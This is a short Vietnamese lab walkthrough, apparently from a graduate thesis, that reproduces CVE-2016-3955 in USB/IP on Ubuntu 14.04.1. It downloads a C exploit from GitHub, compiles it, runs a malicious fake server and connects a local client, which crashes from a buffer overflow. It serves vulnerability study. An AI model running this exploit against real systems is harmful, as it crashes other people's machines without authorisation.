# Thực nghiệm thứ nhất 

## Kịch bản 

- Chạy trên Ubuntu 14.04.1 
- Sử dụng server và client trên cùng một node
- Sử dụng một chương trình C để giả mạo server 
- Client kết nối tới server giả mạo 

Kết quả: 

- Client sẽ bị crash vì tràn bộ đệm 

## Thiết lập 

### Server 

- Tải chương trình C 

    ```
    wget https://raw.githubusercontent.com/MinhKMA/graduate_thesis/master/CVE-2016-3955.c
    ```
- Biên dịch 

    ```
    gcc CVE-2016-3955.c -o CVE-2016-3955
    ```

- Chạy server giả mạo 

    ```
    modprobe usbip-core
    modprobe usbip-host
    modprobe vhci-hcd
    ```

    ```
    ./CVE-2016-3955
    ```
### Client 

- Cài đặt USB/IP

    ```
    apt-get install usbip -y
    ```

- Kết nối với server 

    ```
    usbip -a 127.0.0.1 2-1 -D
    ```

- Client bị crash

